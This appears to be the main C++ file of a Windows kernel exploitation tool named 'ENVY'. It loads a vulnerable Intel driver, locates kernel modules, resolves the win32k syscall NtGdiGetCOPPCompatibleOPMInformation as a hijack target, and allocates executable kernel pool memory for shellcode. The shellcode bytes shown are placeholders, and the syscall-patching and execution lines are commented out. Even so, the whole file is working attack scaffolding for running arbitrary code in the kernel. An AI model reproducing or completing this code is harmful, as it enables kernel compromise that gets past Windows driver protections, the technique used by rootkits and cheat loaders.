#define USING_INTEL_DRIVER

#ifdef USING_INTEL_DRIVER
#include "shittel_driver.h"
#endif 

#include "kernel_module.h"
#include <filesystem>

using namespace kernel;

int main(int argc, char** args)
{
	std::cout << "[+] Welcome to ENVY..." << std::endl;
	std::cout << "[+] Loading vulnerable driver..." << std::endl;
	std::unique_ptr<kernel::vulnerable_driver> driver_resource = std::unique_ptr<kernel::vulnerable_driver>(new intel::intel_vulnerable_driver());
	
	kernel_module* module = kernel_module::get_kernel_module("win32kbase.sys");
	kernel_module* ntkrnl = kernel_module::get_kernel_module("ntoskrnl.exe");
	kernel_module* win32u = kernel_module::get_kernel_module("win32kfull.sys");
	uint64_t vulnerable_syscall = win32u->get_module_export(driver_resource.get(), "NtGdiGetCOPPCompatibleOPMInformation");
	std::cout << *module;
	std::cout << *ntkrnl;

	uint8_t shellbytes[] = { 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x90, 0xC3};

	uint64_t shellcode_buffer = reinterpret_cast<uint64_t>(VirtualAlloc(nullptr, sizeof(shellbytes), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
	//win32u->patch_syscall(driver_resource.get(), shellcode_buffer);
	////win32u->execute_and_restore_syscall<void(*)(void)>(driver_resource.get());
	uint64_t shellcode_pool = driver_resource->allocate_kernel_pool(POOL_TYPE::NonPagedPoolExecute, sizeof(shellbytes));
	//win32u->patch_syscall(driver_resource.get(), shellcode_buffer);
	//win32u->execute_and_restore_syscall<void>(driver_resource.get(), nullptr);

	//driver_resource->free_kernel_pool(shellcode_pool);

	return 0;
}